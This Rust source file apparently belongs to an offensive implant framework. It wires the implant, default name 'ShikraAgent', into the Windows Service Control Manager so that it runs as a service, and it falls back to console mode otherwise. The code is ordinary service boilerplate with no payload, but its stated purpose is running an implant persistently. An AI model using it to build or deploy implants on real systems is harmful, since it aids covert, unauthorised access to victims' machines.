//! Windows Service Control Manager integration.
//!
#![allow(unsafe_code)]

//! When the builder bakes in a service name, the implant registers with the
//! SCM and runs its normal runtime from the service entry point. If the
//! process was not started by the SCM (e.g. manual execution during testing),
//! the dispatcher reports the failure and the caller falls back to console
//! mode.

#[cfg(windows)]
mod imp {
    use std::ffi::c_void;
    use std::sync::OnceLock;
    use windows_sys::Win32::Foundation::{GetLastError, ERROR_FAILED_SERVICE_CONTROLLER_CONNECT};
    use windows_sys::Win32::System::Services::{
        RegisterServiceCtrlHandlerExW, SetServiceStatus, StartServiceCtrlDispatcherW,
        SERVICE_ACCEPT_STOP, SERVICE_CONTROL_STOP, SERVICE_RUNNING, SERVICE_STATUS,
        SERVICE_STOPPED, SERVICE_TABLE_ENTRYW, SERVICE_WIN32_OWN_PROCESS,
    };

    static SERVICE_NAME: OnceLock<String> = OnceLock::new();
    static STATUS_HANDLE: OnceLock<usize> = OnceLock::new();
    static RUN_AGENT: OnceLock<fn() -> anyhow::Result<()>> = OnceLock::new();

    fn wide(text: &str) -> Vec<u16> {
        text.encode_utf16().chain(std::iter::once(0)).collect()
    }

    fn set_status(state: u32, controls: u32) {
        if let Some(handle) = STATUS_HANDLE.get().copied() {
            let status = SERVICE_STATUS {
                dwServiceType: SERVICE_WIN32_OWN_PROCESS,
                dwCurrentState: state,
                dwControlsAccepted: controls,
                dwWin32ExitCode: 0,
                dwServiceSpecificExitCode: 0,
                dwCheckPoint: 0,
                dwWaitHint: 0,
            };
            unsafe {
                SetServiceStatus(handle as *mut c_void, &status);
            }
        }
    }

    unsafe extern "system" fn handler(
        control: u32,
        _event_type: u32,
        _data: *mut c_void,
        _ctx: *mut c_void,
    ) -> u32 {
        if control == SERVICE_CONTROL_STOP {
            set_status(SERVICE_STOPPED, 0);
            std::process::exit(0);
        }
        0
    }

    unsafe extern "system" fn service_main(_argc: u32, _argv: *mut *mut u16) {
        let name = SERVICE_NAME
            .get()
            .cloned()
            .unwrap_or_else(|| "ShikraAgent".into());
        let name_wide = wide(&name);
        let handle =
            RegisterServiceCtrlHandlerExW(name_wide.as_ptr(), Some(handler), std::ptr::null());
        if !handle.is_null() {
            let _ = STATUS_HANDLE.set(handle as usize);
        }
        set_status(SERVICE_RUNNING, SERVICE_ACCEPT_STOP);

        if let Some(run_agent) = RUN_AGENT.get() {
            let _ = run_agent();
        }
        set_status(SERVICE_STOPPED, 0);
    }

    /// Runs the SCM dispatcher with the agent entry point. Returns `false`
    /// when the process was not started by the service controller, so the
    /// caller can run normally.
    pub fn run(name: &str, run_agent: fn() -> anyhow::Result<()>) -> bool {
        let _ = SERVICE_NAME.set(name.to_string());
        let _ = RUN_AGENT.set(run_agent);
        let name_wide = wide(name);
        let table = [
            SERVICE_TABLE_ENTRYW {
                lpServiceName: name_wide.as_ptr() as *mut u16,
                lpServiceProc: Some(service_main),
            },
            SERVICE_TABLE_ENTRYW {
                lpServiceName: std::ptr::null_mut(),
                lpServiceProc: None,
            },
        ];
        let started = unsafe { StartServiceCtrlDispatcherW(table.as_ptr()) };
        if started == 0 {
            let error = unsafe { GetLastError() };
            if error == ERROR_FAILED_SERVICE_CONTROLLER_CONNECT {
                return false;
            }
        }
        true
    }
}

#[cfg(windows)]
pub use imp::run;

#[cfg(not(windows))]
pub fn run(_name: &str, _run_agent: fn() -> anyhow::Result<()>) -> bool {
    false
}
